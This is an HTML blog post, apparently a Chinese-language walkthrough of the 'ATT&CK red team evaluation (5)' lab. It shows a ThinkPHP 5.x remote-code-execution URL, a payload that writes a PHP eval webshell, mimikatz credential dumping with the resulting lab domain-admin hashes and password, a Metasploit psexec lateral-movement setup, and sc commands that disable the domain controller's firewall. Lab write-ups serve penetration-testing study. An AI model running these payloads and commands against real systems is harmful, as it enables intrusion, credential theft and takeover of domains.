@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        ATT&CK红队评估(五) | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">ATT&CK红队评估(五)</div>
+        <div class="post-info">
+          
+  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a><a href="/tags/ThinkPHP5-%E6%BC%8F%E6%B4%9E/" class="post-tag">#ThinkPHP5 漏洞</a>
+
+
+          <span class="post-date">2023-06-06</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">ThinkPHP 5.x 远程命令执行</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">意外的后门</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">上线MSF</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">内网</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">进程迁移</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">域控密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Psexec 横向</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">CS 使用Psexec 拿下域控</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">权限维持</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">黄金票据</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">DSRM 后门</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Metasploit  清理</span></a></li></ol></li></ol></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685949656213-5dc9110a-9991-4fe1-b375-e28f9b0ea908.png#averageHue=%23fefefe&clientId=u01d3985c-b0c4-4&from=paste&height=367&id=u5e58e41c&originHeight=733&originWidth=1915&originalType=binary&ratio=2&rotation=0&showTitle=false&size=40555&status=done&style=none&taskId=ud9c3a270-3273-401f-9103-29265be1b6b&title=&width=957.5" alt="image.png"><br>目标  主机  ：192.168.145.150<br><a name="wT2x0"></a></p>
+<h1><span id="web">WEB</span></h1><p>对其进行信息搜集 （目录扫描，端口扫描，服务发现 ，漏扫，等等）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sV -T4 -sC -p 1-65525 192.168.145.150<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685951264942-ed30faa6-58ea-4223-b8d8-36fe296e2a17.png#averageHue=%2318191b&clientId=u01d3985c-b0c4-4&from=paste&height=256&id=u5f5fcb85&originHeight=512&originWidth=1702&originalType=binary&ratio=2&rotation=0&showTitle=false&size=115972&status=done&style=none&taskId=uce56e236-c9b8-4a7b-b847-b5e4cecd408&title=&width=851" alt="image.png"><br>开放服务少，80 端口 ，3306 数据库<br>放在了低版本的PHP 上面<br><a name="noHsM"></a></p>
+<h2><span id="thinkphp-5x-远程命令执行">ThinkPHP 5.x 远程命令执行</span></h2><p>影响范围 ：5.x &lt; 5.1.31, &lt;&#x3D; 5.0.23<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685951419208-3c45e28d-f0b4-4f1f-b5d4-fe84ff1c6886.png#averageHue=%2326292e&clientId=u01d3985c-b0c4-4&from=paste&height=654&id=u05123f8b&originHeight=1307&originWidth=1638&originalType=binary&ratio=2&rotation=0&showTitle=false&size=364723&status=done&style=none&taskId=u0cd337ec-8057-4572-b3f8-ea5fba60169&title=&width=819" alt="image.png"><br>先去访问80端口，看看是搭建 了什么服务<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685951508921-7b4d3471-1fb2-42d9-924f-dc25353b90ce.png#averageHue=%23fbfbfb&clientId=u01d3985c-b0c4-4&from=paste&height=525&id=u11eb3fca&originHeight=1050&originWidth=1768&originalType=binary&ratio=2&rotation=0&showTitle=false&size=69706&status=done&style=none&taskId=ud4534bb0-dd9f-46d6-aa45-d2a6eff66e0&title=&width=884" alt="image.png"><br>噢噢 原来是TP5 啊 ，众所周知是存在代码执行漏洞的。<br>直接使用 POC<br>使用SYSTEM 执行命令看是否成功执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685951925237-97491318-812f-432d-b8b6-99e793624ed4.png#averageHue=%23fcfcfb&clientId=u01d3985c-b0c4-4&from=paste&height=130&id=uce0858db&originHeight=259&originWidth=973&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9031&status=done&style=none&taskId=u4bca7e2c-bec0-413e-8fca-608540d40b2&title=&width=486.5" alt="image.png"><br>ok，执行了系统命令whoami，接下来写shell啦&#x2F;<br>POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22cmd%22])?^%3E%3Eshell.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685952182225-319af137-9caa-40de-af5a-c3386cd921c3.png#averageHue=%23626161&clientId=u01d3985c-b0c4-4&from=paste&height=753&id=u4e4f4889&originHeight=1506&originWidth=2841&originalType=binary&ratio=2&rotation=0&showTitle=false&size=274499&status=done&style=none&taskId=u20b86dee-f531-48d8-9a96-0709c3b9271&title=&width=1420.5" alt="image.png"><br>把GET换成POST ，用蚁剑连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685952326380-320a89e8-cf44-42b3-a7c4-e6f6b359a558.png#averageHue=%23f6f6f6&clientId=u01d3985c-b0c4-4&from=paste&height=566&id=u756dd895&originHeight=1131&originWidth=1818&originalType=binary&ratio=2&rotation=0&showTitle=false&size=127893&status=done&style=none&taskId=u517dfc0b-9307-4989-9429-e9f38bf2f1c&title=&width=909" alt="image.png"></p>
+<p><a name="sAM2l"></a></p>
+<h2><span id="意外的后门">意外的后门</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685967319999-b74943de-4423-4633-b35d-0f662ef09896.png#averageHue=%2317191c&clientId=u01d3985c-b0c4-4&from=paste&height=199&id=u388fef1b&originHeight=398&originWidth=1331&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75742&status=done&style=none&taskId=u361a8a69-4ace-46e6-9542-42832359cc9&title=&width=665.5" alt="image.png"><br>发现一个add.php<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685967361456-83aeec9d-8aef-41a9-8a23-40fc2ac37169.png#averageHue=%23fefefd&clientId=u01d3985c-b0c4-4&from=paste&height=545&id=u6b3a95f9&originHeight=1089&originWidth=2453&originalType=binary&ratio=2&rotation=0&showTitle=false&size=81002&status=done&style=none&taskId=u3045a5fb-348c-4e4d-9f58-453598e1645&title=&width=1226.5" alt="image.png"><br>这个 感觉像是遗留的后门啊 <br>暴力破解一下这个后门 密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685967547481-5c22a8e4-ffe5-4a54-979e-d6b2f94a4aeb.png#averageHue=%23f7f7f6&clientId=u01d3985c-b0c4-4&from=paste&height=718&id=u6174cbf7&originHeight=1435&originWidth=2659&originalType=binary&ratio=2&rotation=0&showTitle=false&size=196609&status=done&style=none&taskId=u17eed42f-0aed-4f14-97a1-fd16a58fecf&title=&width=1329.5" alt="image.png"><br>密码爆破出来了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685967576750-cef5ce4a-c5e1-4b3b-99ce-c8d7deae5b19.png#averageHue=%23ede8e0&clientId=u01d3985c-b0c4-4&from=paste&height=556&id=u417d254c&originHeight=1112&originWidth=1880&originalType=binary&ratio=2&rotation=0&showTitle=false&size=135559&status=done&style=none&taskId=u8f682a91-27df-47e5-9705-88d14624736&title=&width=940" alt="image.png"><br>密码 ： admins <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685967672219-631b43d0-6a5f-4b57-aee9-fb0fe2572684.png#averageHue=%23d8d6d1&clientId=u01d3985c-b0c4-4&from=paste&height=626&id=u0ca8b679&originHeight=1251&originWidth=2683&originalType=binary&ratio=2&rotation=0&showTitle=false&size=308315&status=done&style=none&taskId=u0bf7e062-6440-4afa-a9bb-ec1b1f14eff&title=&width=1341.5" alt="image.png"><br>一个大马把算是 功能也挺多的<br><a name="UkOIt"></a></p>
+<h2><span id="上线msf">上线MSF</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685969228941-ffda4193-dbba-4316-b3da-41d5f36320c3.png#averageHue=%2317181a&clientId=u01d3985c-b0c4-4&from=paste&height=760&id=u5b8b5a95&originHeight=1519&originWidth=1974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=196204&status=done&style=none&taskId=u4ae7109f-8c88-4645-9889-21a50fcecec&title=&width=987" alt="image.png"><br>两张网卡 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">外： 192.168.145.150<br>内： 192.168.183.136<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685969296440-6e4c42ab-3b39-4987-ad8d-700fe1952e3f.png#averageHue=%2317181a&clientId=u01d3985c-b0c4-4&from=paste&height=238&id=u48eed6c0&originHeight=475&originWidth=1411&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51943&status=done&style=none&taskId=u0c3816e5-a655-454f-89d6-41506b9f936&title=&width=705.5" alt="image.png"><br>域： sun.com <br>ping sun.com 获取主域的IP地址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685969329655-be5ef680-1393-49a6-b451-61d4add8017e.png#averageHue=%2318191b&clientId=u01d3985c-b0c4-4&from=paste&height=274&id=ue42c8f6f&originHeight=547&originWidth=1363&originalType=binary&ratio=2&rotation=0&showTitle=false&size=88470&status=done&style=none&taskId=u6a2f680a-5c4f-452c-acaf-20574212ff0&title=&width=681.5" alt="image.png"><br>主域IP地址： 192.168.183.138<br><a name="aNyZ6"></a></p>
+<h1><span id="内网">内网</span></h1><p><a name="BIJMg"></a></p>
+<h2><span id="信息搜集">信息搜集</span></h2><p>添加路由 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685969485206-9c64901e-727c-451d-aeff-d7ebd234b46a.png#averageHue=%2317181a&clientId=u01d3985c-b0c4-4&from=paste&height=365&id=uc15f96c9&originHeight=730&originWidth=1962&originalType=binary&ratio=2&rotation=0&showTitle=false&size=97107&status=done&style=none&taskId=u72c987a7-5e92-453a-acd4-311ef2acd80&title=&width=981" alt="image.png"><br>既然发现了主域 ，看看域内是否还存在其他机器<br>使用smb扫描 一开始g了 卡了不动，还以为不行，结果是session 掉线了<br>换成了arp_scanner<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685970733673-dc7b6521-2d6c-4452-982a-7e7f5a606767.png#averageHue=%23191a1c&clientId=u8932858d-75dc-4&from=paste&height=166&id=u9f2cec80&originHeight=332&originWidth=1665&originalType=binary&ratio=2&rotation=0&showTitle=false&size=87786&status=done&style=none&taskId=u9199348a-e0d1-4aee-ba50-e97eb638c60&title=&width=832.5" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[+]     IP: 192.168.183.6 MAC 00:0c:29:43:ea:95 (VMware, Inc.)                                                                                                                                            <br>[+]     IP: 192.168.183.138 MAC 00:0c:29:c3:41:e8 (VMware, Inc.) <br></code></pre></td></tr></table></figure>
+<p>这两个IP地址，搭建代理使用namp 进行扫描一下服务信息 <br>这里使用vemom搭建代理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685971346409-ffaf0dd1-4371-4c31-b6e2-2a2bfa784c55.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=385&id=u4201965d&originHeight=770&originWidth=1989&originalType=binary&ratio=2&rotation=0&showTitle=false&size=84182&status=done&style=none&taskId=u90daa079-97aa-4517-be51-50d0ec20d6f&title=&width=994.5" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxychains4 nmap -Pn -sT -sV 192.168.183.6 192.168.183.138  -F<br></code></pre></td></tr></table></figure>
+<p>进行扫描的时候先简单搜集一下本机信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685971575427-66106320-836d-49e0-a884-f282e05d64af.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=535&id=u620ae012&originHeight=1070&originWidth=1611&originalType=binary&ratio=2&rotation=0&showTitle=false&size=104219&status=done&style=none&taskId=u52e05679-3ea5-45f9-a563-d09b3d737fa&title=&width=805.5" alt="image.png"><br>本机权限是administrator 试一下getsystem<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685971671351-38b6cffe-c66a-4d3c-964f-959203edf05e.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=355&id=u2f0ecace&originHeight=710&originWidth=1482&originalType=binary&ratio=2&rotation=0&showTitle=false&size=99138&status=done&style=none&taskId=u3fa9f504-6e7a-45a6-ac44-75bba3e9c95&title=&width=741" alt="image.png"><br>成功到system权限<br>查看共享 和  查看域管理员的名字 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685971814775-4375869a-5245-49fc-bc61-3dc4c83a0534.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=471&id=udd43012f&originHeight=942&originWidth=1829&originalType=binary&ratio=2&rotation=0&showTitle=false&size=89720&status=done&style=none&taskId=ud7891a39-1eb9-4f7a-b025-6072b72ee2a&title=&width=914.5" alt="image.png"><br>查看开启的服务<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685971860735-57a72a93-3f1b-4041-898f-87c0eacece7e.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=734&id=u64877fa9&originHeight=1468&originWidth=1660&originalType=binary&ratio=2&rotation=0&showTitle=false&size=178099&status=done&style=none&taskId=ub8194524-ede5-4c8f-b45f-b0f495f6046&title=&width=830" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;domain controllers&quot; /domain  # 查看域控制器（可能有多台）<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685971876548-84ed2db8-c1dc-4ae8-a3bc-d91db4f9b4b0.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=463&id=u442a36b9&originHeight=926&originWidth=1621&originalType=binary&ratio=2&rotation=0&showTitle=false&size=91210&status=done&style=none&taskId=u73a3b60e-ed9a-4454-ace1-9f08b20fe87&title=&width=810.5" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ipconfig /all   # 查看本机ip，所在域<br>route print     # 打印路由信息<br>net view        # 查看局域网内其他主机名<br>arp -a          # 查看arp缓存<br>whoami          # 查看当前用户<br>net start       # 查看开启了哪些服务<br>net share       # 查看开启了哪些共享<br><br>net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators   # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字<br>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;domain controllers&quot; /domain  # 查看域控制器（可能有多台）<br></code></pre></td></tr></table></figure>
+<p>查看扫描结果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972159054-bbbaa547-00a2-4e90-a636-c99671897ed2.png#averageHue=%2318191b&clientId=u8932858d-75dc-4&from=paste&height=434&id=u055321bf&originHeight=868&originWidth=1935&originalType=binary&ratio=2&rotation=0&showTitle=false&size=194128&status=done&style=none&taskId=u4374c93a-36f8-40aa-8802-607feae8e30&title=&width=967.5" alt="image.png"><br>192.168.183.6 是一台 Linux 但是只开放了22 端口 ，（我也不知道这台机子哪里来的，可能是某个分出的网卡，先放一边）<br>域控是一台2008 的主机 <br>欧克 ，<br>先使用mimikatz 抓取密码<br>使用kiwi 工具抓取密码（比较方便，懒得上传）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972311175-72dbd6ba-dbc5-4bf4-bde2-2a02ab493138.png#averageHue=%2318191b&clientId=u8932858d-75dc-4&from=paste&height=240&id=u3a9a438a&originHeight=480&originWidth=1332&originalType=binary&ratio=2&rotation=0&showTitle=false&size=64204&status=done&style=none&taskId=u2a7ab9e6-08c6-409a-a277-5c419c74e44&title=&width=666" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972452828-fa885082-d2e7-4540-b272-06b075aad7bb.png#averageHue=%2318191b&clientId=u8932858d-75dc-4&from=paste&height=225&id=ubc988b14&originHeight=450&originWidth=1434&originalType=binary&ratio=2&rotation=0&showTitle=false&size=77016&status=done&style=none&taskId=uec548930-1cb5-4031-b5c9-2d48b3b3da5&title=&width=717" alt="image.png"><br>报错<br>因为当前是32位的进程无法运行mimikatz，所以我们需要将当前进程迁移到一个64位的进程中。执行ps命令后随便找一个64位的进程迁移进去就行了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972531702-44cb03fa-e01e-4f53-a9c0-c902f86b0387.png#averageHue=%23191a1c&clientId=u8932858d-75dc-4&from=paste&height=481&id=ue70220fc&originHeight=962&originWidth=2022&originalType=binary&ratio=2&rotation=0&showTitle=false&size=267837&status=done&style=none&taskId=u298b677a-1aac-45f8-a542-ca17d0da0e9&title=&width=1011" alt="image.png"><br><a name="rNc9Z"></a></p>
+<h2><span id="进程迁移">进程迁移</span></h2><p>迁移到300 看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972613414-ce201dd8-17f9-4b96-87eb-0541a2c86126.png#averageHue=%2318191b&clientId=u8932858d-75dc-4&from=paste&height=119&id=ube3b61a7&originHeight=237&originWidth=1480&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39858&status=done&style=none&taskId=u8483f984-bdde-4391-bbc3-6d588894442&title=&width=740" alt="image.png"><br>好像不行换一个<br>额 犯错了 我把他换成了一个低权限的了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972809340-42f48fb0-0921-4d1c-b1f1-c646b920fcbd.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=255&id=u3f59f3f3&originHeight=510&originWidth=1868&originalType=binary&ratio=2&rotation=0&showTitle=false&size=77959&status=done&style=none&taskId=u00944930-d47b-47d6-a8e2-df9059bd3eb&title=&width=934" alt="image.png"><br>现在想迁移到其他经常都是没有权限的，getsystem也不管用了 重新获取shell ，看看<br>ok 重新获取了shell get到system权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685972922598-72de0173-3531-4d69-9308-74816b9ef75f.png#averageHue=%23191a1c&clientId=u8932858d-75dc-4&from=paste&height=134&id=uc47e7d4d&originHeight=268&originWidth=1380&originalType=binary&ratio=2&rotation=0&showTitle=false&size=41068&status=done&style=none&taskId=ud025c5a0-1b63-4903-a250-dbcc197b8f7&title=&width=690" alt="image.png"><br>现在切换到2464 这个pid <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685973067244-210c511f-11e7-4b64-994f-845ecca156b5.png#averageHue=%23191a1c&clientId=u8932858d-75dc-4&from=paste&height=378&id=ub06be37e&originHeight=756&originWidth=1982&originalType=binary&ratio=2&rotation=0&showTitle=false&size=236386&status=done&style=none&taskId=u204f22be-2812-4250-b506-bd7742762c5&title=&width=991" alt="image.png"><br>成功获取到了域管理员密码<br><a name="A01CC"></a></p>
+<h2><span id="域控密码">域控密码</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685973097585-224cbcb8-c933-4bc5-a79d-3872a44cecbf.png#averageHue=%23161719&clientId=u8932858d-75dc-4&from=paste&height=674&id=u7816f53a&originHeight=1348&originWidth=2586&originalType=binary&ratio=2&rotation=0&showTitle=false&size=196305&status=done&style=none&taskId=u16f0caf3-dc37-4164-b662-eabab1e97da&title=&width=1293" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SID : S-1-5-21-3388020223-1982701712-4030140183-500                                                                                                                         <br>        msv :                                                                                                                                                                             <br>         [00000003] Primary                                                                                                                                                               <br>         * Username : Administrator                                                                                                                                                       <br>         * Domain   : SUN                                                                                                                                                                 <br>         * LM       : c8c42d085b5e3da2e9260223765451f1                                                                                                                                    <br>         * NTLM     : e8bea972b3549868cecd667a64a6ac46                                                                                                                                    <br>         * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee                                                                                                                            <br>        tspkg :                                                                                                                                                                           <br>         * Username : Administrator                                                                                                                                                       <br>         * Domain   : SUN                                                                                                                                                                 <br>         * Password : dc123.com                                                                                                                                                           <br>        wdigest :                                                                                                                                                                         <br>         * Username : Administrator                                                                                                                                                       <br>         * Domain   : SUN                                                                                                                                                                 <br>         * Password : dc123.com                                                                                                                                                           <br>        kerberos :                                                                                                                                                                        <br>         * Username : Administrator                                                                                                                                                       <br>         * Domain   : SUN.COM                                                                                                                                                             <br>         * Password : dc123.com                                                                                                                                                           <br>        ssp :<br></code></pre></td></tr></table></figure>
+<p>接一下可以使用psexec 进行横向获取域控权限了<br><a name="r8bBo"></a></p>
+<h2><span id="psexec-横向">Psexec 横向</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use exploit/windows/smb/psexec<br>set rhosts 192.168.183.138<br>set SMBDomain SUN<br>set SMBUser administrator<br>set SMBPass dc123.com<br>set payload windows/meterpreter/bind_tcp<br>set rhost 192.168.138.138<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685973550438-2de5c363-7ebe-4b55-a8d7-465150f6cea3.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=741&id=u4e25079e&originHeight=1482&originWidth=2398&originalType=binary&ratio=2&rotation=0&showTitle=false&size=235399&status=done&style=none&taskId=uf98111eb-ddc4-48c0-a6de-9b317f3107d&title=&width=1199" alt="image.png"><br>连接到服务器 ，但是无法创建套接字 ，会话<br>（可能是域控开启了防火墙的原因）<br>使用 sc 命令来关闭防火墙<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685973824835-03a7d589-4291-433c-bb8a-540aa0fa88f9.png#averageHue=%23f8f8f7&clientId=u8932858d-75dc-4&from=paste&height=417&id=u7b941f3a&originHeight=834&originWidth=1846&originalType=binary&ratio=2&rotation=0&showTitle=false&size=159506&status=done&style=none&taskId=u2ef05852-b396-43bf-b5aa-aa69d437b66&title=&width=923" alt="image.png"><br>SC命令详细 ：<a target="_blank" rel="noopener" href="https://blog.51cto.com/hukunlin/235229">https://blog.51cto.com/hukunlin/235229</a><br>与域控建立 IPC连接 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685975615968-581595b9-e0d9-43dd-92ef-fe0d039f1c6f.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=204&id=u6fc2e091&originHeight=407&originWidth=2019&originalType=binary&ratio=2&rotation=0&showTitle=false&size=59304&status=done&style=none&taskId=u9a2246ac-7561-4c51-a32e-132575ecba0&title=&width=1009.5" alt="image.png"><br>使用IPC 进行连接的时候先查看一下share  （net share）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685975648743-16bd91f6-f482-4596-ac2b-cda44226472e.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=230&id=u3c613fbf&originHeight=460&originWidth=1540&originalType=binary&ratio=2&rotation=0&showTitle=false&size=43755&status=done&style=none&taskId=ucf901071-1c46-499e-82d3-b3e15c656cf&title=&width=770" alt="image.png"><br>如果这里使用小写的ipc$ 是行不通的，会显示没有这个文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685975722120-a42d8e54-b95a-46e8-8484-6642abb7e9c1.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=143&id=uf7b0d37b&originHeight=286&originWidth=1853&originalType=binary&ratio=2&rotation=0&showTitle=false&size=35754&status=done&style=none&taskId=u20a8ae05-9304-4f6a-9418-cad01e6bc27&title=&width=926.5" alt="image.png"><br>就像这样 。。。。<br>ok，接下来使用sc 命令关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">创建服务<br>sc \\192.168.183.138 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;<br>立即启动服务<br>sc \\192.168.183.138 start unablefirewall<br></code></pre></td></tr></table></figure>
